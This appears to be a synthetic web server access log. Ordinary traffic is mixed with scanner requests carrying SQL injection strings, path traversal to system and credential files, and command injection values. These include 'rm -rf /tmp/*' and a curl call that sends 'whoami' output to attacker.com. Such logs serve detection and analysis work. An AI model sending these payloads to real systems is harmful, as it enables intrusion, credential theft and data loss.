185.220.1.5 - - [09/Mar/2026:21:51:10 +0000] "GET /api/users HTTP/1.1" 302 55816 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
192.168.1.25 - - [09/Mar/2026:22:07:10 +0000] "PUT /pricing HTTP/1.1" 200 56465 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
172.16.0.8 - - [09/Mar/2026:22:08:10 +0000] "POST /docs/quickstart HTTP/1.1" 200 16751 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
10.0.0.5 - - [09/Mar/2026:22:14:10 +0000] "GET /search?q=sale HTTP/1.1" 200 60835 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
192.168.1.50 - - [09/Mar/2026:22:30:10 +0000] "POST /login HTTP/1.1" 200 9498 "https://google.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
10.0.0.5 - - [09/Mar/2026:22:31:10 +0000] "GET /products HTTP/1.1" 301 19563 "https://google.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
192.168.1.25 - - [09/Mar/2026:22:36:10 +0000] "GET /blog HTTP/1.1" 302 39202 "https://google.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
66.249.66.1 - - [09/Mar/2026:22:40:10 +0000] "GET /favicon.ico HTTP/1.1" 200 2400 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
8.8.8.1 - - [09/Mar/2026:22:52:10 +0000] "GET /news/latest HTTP/1.1" 304 25544 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
185.220.1.5 - - [09/Mar/2026:22:56:10 +0000] "GET /dashboard HTTP/1.1" 200 33193 "https://google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
203.0.113.42 - - [09/Mar/2026:23:01:10 +0000] "PUT /api/health HTTP/1.1" 404 42443 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
192.168.1.10 - - [09/Mar/2026:23:03:10 +0000] "GET /search?q=iphone HTTP/1.1" 200 59720 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
10.0.0.5 - - [09/Mar/2026:23:06:10 +0000] "GET /images/hero.jpg HTTP/1.1" 302 25109 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
203.0.113.7 - - [09/Mar/2026:23:16:10 +0000] "GET /login?user=admin'-- HTTP/1.1" 500 22869 "-" "sqlmap/1.7.12#stable"
104.18.44.135 - - [09/Mar/2026:23:16:10 +0000] "POST /xmlrpc.php HTTP/1.1" 400 25093 "-" "masscan/1.3.2"
209.141.46.31 - - [09/Mar/2026:23:17:10 +0000] "GET /login.php HTTP/1.1" 400 56465 "-" "curl/7.88.1"
104.18.44.135 - - [09/Mar/2026:23:18:10 +0000] "GET /.ssh/id_rsa HTTP/1.1" 200 36550 "-" "masscan/1.3.2"
209.141.46.31 - - [09/Mar/2026:23:21:10 +0000] "GET /.git/config HTTP/1.1" 400 46659 "-" "curl/7.88.1"
172.16.0.20 - - [09/Mar/2026:23:21:10 +0000] "POST /products?page=2 HTTP/1.1" 404 30439 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
77.83.247.15 - - [09/Mar/2026:23:22:10 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 403 2226 "-" "Nikto/2.1.6"
77.83.247.15 - - [09/Mar/2026:23:23:10 +0000] "POST /web.config HTTP/1.1" 404 14550 "-" "Nikto/2.1.6"
104.18.44.135 - - [09/Mar/2026:23:30:10 +0000] "POST /login.php HTTP/1.1" 400 4993 "-" "masscan/1.3.2"
104.18.44.135 - - [09/Mar/2026:23:35:10 +0000] "GET /.env.backup HTTP/1.1" 200 64897 "-" "masscan/1.3.2"
157.55.39.10 - - [09/Mar/2026:23:35:10 +0000] "GET /api/v1/stats HTTP/1.1" 200 6000 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
104.18.44.135 - - [09/Mar/2026:23:36:10 +0000] "GET /web.config HTTP/1.1" 404 53545 "-" "masscan/1.3.2"
198.20.69.74 - - [09/Mar/2026:23:37:10 +0000] "GET /.well-known/security.txt HTTP/1.1" 403 61545 "-" "Nikto/2.1.6"
94.103.82.33 - - [09/Mar/2026:23:42:10 +0000] "GET /test?q=$(id) HTTP/1.1" 200 62895 "-" "curl/7.88.1"
185.176.27.24 - - [09/Mar/2026:23:43:10 +0000] "POST /news?id=1+AND+1=2+UNION+SELECT+1,2,3-- HTTP/1.1" 404 46770 "-" "sqlmap/1.7.12#stable"
172.16.0.8 - - [09/Mar/2026:23:43:10 +0000] "GET /favicon.ico HTTP/1.1" 200 53396 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
209.141.46.31 - - [09/Mar/2026:23:44:10 +0000] "POST /etc/passwd HTTP/1.1" 200 35197 "-" "curl/7.88.1"
198.51.100.7 - - [09/Mar/2026:23:49:10 +0000] "POST /docs/quickstart HTTP/1.1" 404 6592 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
198.20.69.74 - - [09/Mar/2026:23:51:10 +0000] "GET /.git/HEAD HTTP/1.1" 404 12517 "-" "Nikto/2.1.6"
192.168.1.25 - - [09/Mar/2026:23:51:10 +0000] "GET /contact HTTP/1.1" 200 55349 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
77.83.247.15 - - [09/Mar/2026:23:53:10 +0000] "POST /composer.json HTTP/1.1" 500 31924 "-" "Nikto/2.1.6"
209.141.46.31 - - [09/Mar/2026:23:55:10 +0000] "POST /api/swagger.json HTTP/1.1" 200 37274 "-" "curl/7.88.1"
185.176.27.24 - - [09/Mar/2026:23:57:10 +0000] "POST /news?id=1+AND+1=2+UNION+SELECT+1,2,3-- HTTP/1.1" 400 33138 "-" "sqlmap/1.7.12#stable"
77.83.247.15 - - [09/Mar/2026:23:58:10 +0000] "GET /.ssh/id_rsa HTTP/1.1" 400 10117 "-" "Nikto/2.1.6"
104.18.44.135 - - [09/Mar/2026:23:59:10 +0000] "POST /phpmyadmin/ HTTP/1.1" 500 63648 "-" "masscan/1.3.2"
104.21.33.10 - - [09/Mar/2026:23:59:10 +0000] "GET /products?sort=price HTTP/1.1" 304 62010 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
185.220.1.5 - - [10/Mar/2026:00:00:10 +0000] "PUT /index.html HTTP/1.1" 404 2082 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
10.0.0.5 - - [10/Mar/2026:00:02:10 +0000] "GET /login HTTP/1.1" 301 44007 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
94.103.82.33 - - [10/Mar/2026:00:03:10 +0000] "GET /test?q=$(id) HTTP/1.1" 400 13504 "-" "curl/7.88.1"
77.83.247.15 - - [10/Mar/2026:00:04:10 +0000] "POST /phpmyadmin/ HTTP/1.1" 404 39967 "-" "Nikto/2.1.6"
198.20.69.74 - - [10/Mar/2026:00:05:10 +0000] "GET /.aws/credentials HTTP/1.1" 200 33495 "-" "Nikto/2.1.6"
185.176.27.24 - - [10/Mar/2026:00:07:10 +0000] "GET /news?id=1+AND+1=2+UNION+SELECT+1,2,3-- HTTP/1.1" 200 7634 "-" "sqlmap/1.7.12#stable"
66.249.66.1 - - [10/Mar/2026:00:07:10 +0000] "GET /robots.txt HTTP/1.1" 200 19113 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
66.249.66.1 - - [10/Mar/2026:00:07:10 +0000] "POST /favicon.ico HTTP/1.1" 200 29715 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
94.103.82.33 - - [10/Mar/2026:00:10:10 +0000] "GET /check?target=google.com&&curl+http://attacker.com/$(whoami) HTTP/1.1" 404 62926 "-" "curl/7.88.1"
203.0.113.7 - - [10/Mar/2026:00:11:10 +0000] "GET /page?id=1%27+ORDER+BY+10-- HTTP/1.1" 200 36923 "-" "sqlmap/1.7.12#stable"
94.103.82.33 - - [10/Mar/2026:00:12:10 +0000] "POST /cgi-bin/test.cgi?param=;rm+-rf+/tmp/* HTTP/1.1" 404 40099 "-" "curl/7.88.1"
94.103.82.1 - - [10/Mar/2026:00:17:10 +0000] "GET /api/products HTTP/1.1" 200 33213 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
94.103.82.33 - - [10/Mar/2026:00:18:10 +0000] "GET /api/exec?cmd=ls+-la+/ HTTP/1.1" 500 899 "-" "curl/7.88.1"
198.51.100.7 - - [10/Mar/2026:00:19:10 +0000] "GET /static/js/main.js HTTP/1.1" 200 39546 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
104.18.44.135 - - [10/Mar/2026:00:25:10 +0000] "GET /web.config HTTP/1.1" 404 56449 "-" "masscan/1.3.2"
192.168.1.10 - - [10/Mar/2026:00:28:10 +0000] "PUT /faq HTTP/1.1" 301 62442 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
198.20.69.74 - - [10/Mar/2026:00:29:10 +0000] "GET /login.php HTTP/1.1" 200 15262 "-" "Nikto/2.1.6"
203.0.113.7 - - [10/Mar/2026:00:30:10 +0000] "GET /news?id=1+AND+1=2+UNION+SELECT+1,2,3-- HTTP/1.1" 500 55901 "-" "sqlmap/1.7.12#stable"
94.103.82.1 - - [10/Mar/2026:00:32:10 +0000] "GET /favicon.ico HTTP/1.1" 200 15975 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
94.103.82.33 - - [10/Mar/2026:00:35:10 +0000] "POST /ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1" 200 14699 "-" "curl/7.88.1"
209.141.46.31 - - [10/Mar/2026:00:36:10 +0000] "GET /actuator/env HTTP/1.1" 400 17074 "-" "curl/7.88.1"
66.249.66.1 - - [10/Mar/2026:00:39:10 +0000] "GET /index.html HTTP/1.1" 304 21967 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
209.141.46.31 - - [10/Mar/2026:00:40:10 +0000] "GET /phpmyadmin/ HTTP/1.1" 200 28717 "-" "curl/7.88.1"
198.20.69.74 - - [10/Mar/2026:00:47:10 +0000] "GET /api/file?name=../../../.env HTTP/1.1" 200 16760 "-" "Nikto/2.1.6"
185.220.1.5 - - [10/Mar/2026:00:50:10 +0000] "POST /about-us HTTP/1.1" 200 10057 "https://google.com" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
203.0.113.42 - - [10/Mar/2026:00:52:10 +0000] "POST /sitemap.xml HTTP/1.1" 200 19533 "https://google.com" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
77.83.247.15 - - [10/Mar/2026:00:53:10 +0000] "POST /appsettings.json HTTP/1.1" 500 34758 "-" "Nikto/2.1.6"
77.83.247.15 - - [10/Mar/2026:00:56:10 +0000] "POST /.git/config HTTP/1.1" 400 63292 "-" "Nikto/2.1.6"
209.141.46.31 - - [10/Mar/2026:00:57:10 +0000] "POST /web.config HTTP/1.1" 404 60310 "-" "curl/7.88.1"
66.249.66.1 - - [10/Mar/2026:01:01:10 +0000] "GET /shop/phone HTTP/1.1" 304 30598 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
209.141.46.31 - - [10/Mar/2026:01:05:10 +0000] "GET /backup.zip HTTP/1.1" 404 32309 "-" "curl/7.88.1"
10.0.0.5 - - [10/Mar/2026:01:05:10 +0000] "GET /logout HTTP/1.1" 304 14735 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
209.141.46.31 - - [10/Mar/2026:01:06:10 +0000] "GET /composer.json HTTP/1.1" 400 28388 "-" "curl/7.88.1"
104.21.33.10 - - [10/Mar/2026:01:08:10 +0000] "POST /faq HTTP/1.1" 404 21963 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
198.20.69.74 - - [10/Mar/2026:01:09:10 +0000] "GET /view?f=..%2F..%2F..%2F..%2Fetc%2Fnginx%2Fnginx.conf HTTP/1.1" 500 37448 "-" "Nikto/2.1.6"
104.18.44.135 - - [10/Mar/2026:01:10:10 +0000] "GET /.ssh/id_rsa HTTP/1.1" 403 822 "-" "masscan/1.3.2"
94.103.82.33 - - [10/Mar/2026:01:10:10 +0000] "GET /check?target=google.com&&curl+http://attacker.com/$(whoami) HTTP/1.1" 404 12859 "-" "curl/7.88.1"
94.103.82.33 - - [10/Mar/2026:01:12:10 +0000] "GET /api/exec?cmd=ls+-la+/ HTTP/1.1" 403 18726 "-" "curl/7.88.1"
77.83.247.15 - - [10/Mar/2026:01:16:10 +0000] "GET /assets/../../../../var/log/auth.log HTTP/1.1" 404 6586 "-" "Nikto/2.1.6"
8.8.8.1 - - [10/Mar/2026:01:20:10 +0000] "GET /checkout HTTP/1.1" 200 57781 "https://example.com" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
185.176.27.24 - - [10/Mar/2026:01:22:10 +0000] "GET /tags?name=1'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users)='a'-- HTTP/1.1" 400 48292 "-" "sqlmap/1.7.12#stable"
209.141.46.31 - - [10/Mar/2026:01:22:10 +0000] "POST /composer.json HTTP/1.1" 500 12678 "-" "curl/7.88.1"
185.176.27.24 - - [10/Mar/2026:01:23:10 +0000] "GET /api/data?filter=1'+OR+'a'='a HTTP/1.1" 403 64925 "-" "sqlmap/1.7.12#stable"
77.83.247.15 - - [10/Mar/2026:01:24:10 +0000] "POST /login.php HTTP/1.1" 500 55307 "-" "Nikto/2.1.6"
198.20.69.74 - - [10/Mar/2026:01:26:10 +0000] "POST /web.config HTTP/1.1" 400 36460 "-" "Nikto/2.1.6"
94.103.82.33 - - [10/Mar/2026:01:27:10 +0000] "POST /cgi-bin/test.cgi?param=;rm+-rf+/tmp/* HTTP/1.1" 500 27193 "-" "curl/7.88.1"
77.83.247.15 - - [10/Mar/2026:01:27:10 +0000] "POST /assets/../../../../var/log/auth.log HTTP/1.1" 403 26148 "-" "Nikto/2.1.6"
94.103.82.33 - - [10/Mar/2026:01:31:10 +0000] "POST /api/lookup?domain=example.com|id HTTP/1.1" 200 56094 "-" "curl/7.88.1"
185.176.27.24 - - [10/Mar/2026:01:34:10 +0000] "GET /index.php?option=com_user&task=login&return=';SELECT+1-- HTTP/1.1" 500 22260 "-" "sqlmap/1.7.12#stable"
198.20.69.74 - - [10/Mar/2026:01:38:10 +0000] "GET /api/file?name=../../../.env HTTP/1.1" 403 45248 "-" "Nikto/2.1.6"
157.55.39.10 - - [10/Mar/2026:01:41:10 +0000] "PUT /about HTTP/1.1" 302 40218 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
94.103.82.1 - - [10/Mar/2026:01:49:10 +0000] "GET /api/users HTTP/1.1" 200 42567 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
94.103.82.33 - - [10/Mar/2026:01:50:10 +0000] "GET /ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1" 403 54762 "-" "curl/7.88.1"
192.168.1.10 - - [10/Mar/2026:01:56:10 +0000] "GET /api/v1/health HTTP/1.1" 200 49988 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
66.249.66.1 - - [10/Mar/2026:01:57:10 +0000] "GET / HTTP/1.1" 404 29125 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
185.176.27.24 - - [10/Mar/2026:02:01:10 +0000] "POST /api/data?filter=1'+OR+'a'='a HTTP/1.1" 200 16535 "-" "sqlmap/1.7.12#stable"
172.16.0.20 - - [10/Mar/2026:02:01:10 +0000] "POST /products?sort=price HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
192.168.1.25 - - [10/Mar/2026:02:02:10 +0000] "GET /logout HTTP/1.1" 200 10984 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
104.18.44.135 - - [10/Mar/2026:02:04:10 +0000] "GET /.git/config HTTP/1.1" 200 3277 "-" "masscan/1.3.2"
104.18.44.135 - - [10/Mar/2026:02:04:10 +0000] "GET /api/swagger.json HTTP/1.1" 200 3916 "-" "masscan/1.3.2"
66.249.66.1 - - [10/Mar/2026:02:04:10 +0000] "PUT /api/v1/stats HTTP/1.1" 301 24235 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
209.141.46.31 - - [10/Mar/2026:02:05:10 +0000] "POST /package.json HTTP/1.1" 200 45373 "-" "curl/7.88.1"
104.21.33.10 - - [10/Mar/2026:02:05:10 +0000] "GET /login HTTP/1.1" 200 2546 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
203.0.113.7 - - [10/Mar/2026:02:06:10 +0000] "GET /news?id=1+AND+1=2+UNION+SELECT+1,2,3-- HTTP/1.1" 400 6155 "-" "sqlmap/1.7.12#stable"
203.0.113.42 - - [10/Mar/2026:02:07:10 +0000] "GET /api/v1/stats HTTP/1.1" 200 48840 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
198.20.69.74 - - [10/Mar/2026:02:09:10 +0000] "GET /include?page=../../../../etc/hosts HTTP/1.1" 200 1092 "-" "Nikto/2.1.6"
94.103.82.33 - - [10/Mar/2026:02:09:10 +0000] "GET /test?q=$(id) HTTP/1.1" 404 64736 "-" "curl/7.88.1"
203.0.113.7 - - [10/Mar/2026:02:11:10 +0000] "GET /api/users?id=1;DROP+TABLE+users-- HTTP/1.1" 404 268 "-" "sqlmap/1.7.12#stable"
198.51.100.7 - - [10/Mar/2026:02:15:10 +0000] "GET /settings HTTP/1.1" 200 64610 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
104.21.33.10 - - [10/Mar/2026:02:16:10 +0000] "GET /docs/quickstart HTTP/1.1" 200 46265 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
172.16.0.8 - - [10/Mar/2026:02:16:10 +0000] "GET /login HTTP/1.1" 200 21434 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
10.0.0.5 - - [10/Mar/2026:02:17:10 +0000] "PUT /images/hero.jpg HTTP/1.1" 404 1540 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
104.21.33.10 - - [10/Mar/2026:02:18:10 +0000] "GET /profile HTTP/1.1" 200 4130 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
104.21.33.10 - - [10/Mar/2026:02:18:10 +0000] "GET /static/js/main.js HTTP/1.1" 302 21073 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
198.20.69.74 - - [10/Mar/2026:02:19:10 +0000] "GET /.git/config HTTP/1.1" 404 25676 "-" "Nikto/2.1.6"
185.176.27.24 - - [10/Mar/2026:02:19:10 +0000] "POST /search?q=1'+OR+'1'%3D'1 HTTP/1.1" 200 42151 "-" "sqlmap/1.7.12#stable"
185.176.27.24 - - [10/Mar/2026:02:20:10 +0000] "POST /profile?uid=1+AND+SLEEP(5)-- HTTP/1.1" 200 53977 "-" "sqlmap/1.7.12#stable"
203.0.113.7 - - [10/Mar/2026:02:22:10 +0000] "GET /tags?name=1'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users)='a'-- HTTP/1.1" 400 61212 "-" "sqlmap/1.7.12#stable"
185.176.27.24 - - [10/Mar/2026:02:24:10 +0000] "GET /api/data?filter=1'+OR+'a'='a HTTP/1.1" 200 42219 "-" "sqlmap/1.7.12#stable"
185.176.27.24 - - [10/Mar/2026:02:29:10 +0000] "GET /search?q=1'+OR+'1'%3D'1 HTTP/1.1" 500 30721 "-" "sqlmap/1.7.12#stable"
209.141.46.31 - - [10/Mar/2026:02:31:10 +0000] "GET /login.php HTTP/1.1" 403 24667 "-" "curl/7.88.1"
94.103.82.33 - - [10/Mar/2026:02:33:10 +0000] "GET /api/exec?cmd=ls+-la+/ HTTP/1.1" 404 31782 "-" "curl/7.88.1"
209.141.46.31 - - [10/Mar/2026:02:36:10 +0000] "GET /administrator/ HTTP/1.1" 403 61023 "-" "curl/7.88.1"
77.83.247.15 - - [10/Mar/2026:02:37:10 +0000] "POST /.git/HEAD HTTP/1.1" 200 59542 "-" "Nikto/2.1.6"
77.83.247.15 - - [10/Mar/2026:02:42:10 +0000] "GET /login.php HTTP/1.1" 200 52980 "-" "Nikto/2.1.6"
203.0.113.7 - - [10/Mar/2026:02:43:10 +0000] "POST /news?id=1+AND+1=2+UNION+SELECT+1,2,3-- HTTP/1.1" 404 49962 "-" "sqlmap/1.7.12#stable"
94.103.82.1 - - [10/Mar/2026:02:44:10 +0000] "PUT /cart HTTP/1.1" 302 57672 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
185.176.27.24 - - [10/Mar/2026:02:46:10 +0000] "GET /login?user=admin'-- HTTP/1.1" 403 6264 "-" "sqlmap/1.7.12#stable"
94.103.82.33 - - [10/Mar/2026:02:47:10 +0000] "GET /check?target=google.com&&curl+http://attacker.com/$(whoami) HTTP/1.1" 200 25766 "-" "curl/7.88.1"
203.0.113.7 - - [10/Mar/2026:02:48:10 +0000] "GET /index.php?option=com_user&task=login&return=';SELECT+1-- HTTP/1.1" 200 18960 "-" "sqlmap/1.7.12#stable"
185.176.27.24 - - [10/Mar/2026:02:53:10 +0000] "POST /api/data?filter=1'+OR+'a'='a HTTP/1.1" 403 35278 "-" "sqlmap/1.7.12#stable"
198.51.100.7 - - [10/Mar/2026:02:55:10 +0000] "GET /search?q=laptop HTTP/1.1" 404 51844 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
66.249.66.1 - - [10/Mar/2026:02:59:10 +0000] "GET /static/js/vendor.js HTTP/1.1" 404 34667 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
66.249.66.1 - - [10/Mar/2026:03:20:10 +0000] "GET /favicon.ico HTTP/1.1" 200 45773 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
94.103.82.1 - - [10/Mar/2026:03:28:10 +0000] "PUT /api/health HTTP/1.1" 200 62903 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
198.51.100.7 - - [10/Mar/2026:03:45:10 +0000] "POST /blog HTTP/1.1" 200 45769 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [10/Mar/2026:03:49:10 +0000] "POST /privacy HTTP/1.1" 200 21929 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
10.0.0.8 - - [10/Mar/2026:03:49:10 +0000] "PUT /index.html HTTP/1.1" 304 14720 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
172.16.0.20 - - [10/Mar/2026:03:51:10 +0000] "GET /settings HTTP/1.1" 200 952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
172.16.0.8 - - [10/Mar/2026:03:56:10 +0000] "GET /blog HTTP/1.1" 302 61720 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
8.8.8.1 - - [10/Mar/2026:03:59:10 +0000] "POST /settings HTTP/1.1" 301 10502 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
192.168.1.25 - - [10/Mar/2026:04:08:10 +0000] "POST /api/v1/stats HTTP/1.1" 200 40116 "https://example.com" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
172.16.0.8 - - [10/Mar/2026:04:08:10 +0000] "POST /images/hero.jpg HTTP/1.1" 302 33260 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.50 - - [10/Mar/2026:04:10:10 +0000] "POST /profile HTTP/1.1" 200 7523 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
172.16.0.20 - - [10/Mar/2026:04:21:10 +0000] "GET /terms HTTP/1.1" 404 5302 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
94.103.82.1 - - [10/Mar/2026:04:24:10 +0000] "PUT /about HTTP/1.1" 200 27740 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
203.0.113.42 - - [10/Mar/2026:04:26:10 +0000] "GET /news/latest HTTP/1.1" 200 18731 "https://google.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
8.8.8.1 - - [10/Mar/2026:04:27:10 +0000] "GET /api/health HTTP/1.1" 302 34295 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
192.168.1.10 - - [10/Mar/2026:04:33:10 +0000] "POST /api/v1/stats HTTP/1.1" 200 20975 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
8.8.8.1 - - [10/Mar/2026:04:49:10 +0000] "PUT /index.html HTTP/1.1" 200 5268 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
104.21.33.10 - - [10/Mar/2026:04:50:10 +0000] "GET /search?q=iphone HTTP/1.1" 200 60134 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
192.168.1.25 - - [10/Mar/2026:04:51:10 +0000] "PUT /contact HTTP/1.1" 404 64642 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
172.16.0.8 - - [10/Mar/2026:04:53:10 +0000] "GET /logout HTTP/1.1" 404 9086 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
192.168.1.10 - - [10/Mar/2026:04:54:10 +0000] "GET /docs HTTP/1.1" 200 60354 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
192.168.1.10 - - [10/Mar/2026:04:57:10 +0000] "PUT /favicon.ico HTTP/1.1" 200 8811 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
104.21.33.10 - - [10/Mar/2026:04:59:10 +0000] "GET /profile HTTP/1.1" 200 5287 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
172.16.0.8 - - [10/Mar/2026:05:01:10 +0000] "GET /api/products HTTP/1.1" 302 64158 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.50 - - [10/Mar/2026:05:07:10 +0000] "PUT / HTTP/1.1" 200 41690 "https://google.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
10.0.0.5 - - [10/Mar/2026:05:07:10 +0000] "POST /index.html HTTP/1.1" 200 50333 "https://example.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
104.21.33.10 - - [10/Mar/2026:05:11:10 +0000] "GET /news HTTP/1.1" 404 32775 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
185.220.1.5 - - [10/Mar/2026:05:17:10 +0000] "GET /products?page=2 HTTP/1.1" 200 7868 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
198.51.100.7 - - [10/Mar/2026:05:29:10 +0000] "POST /docs HTTP/1.1" 200 61427 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
203.0.113.42 - - [10/Mar/2026:05:38:10 +0000] "PUT /login HTTP/1.1" 404 17017 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
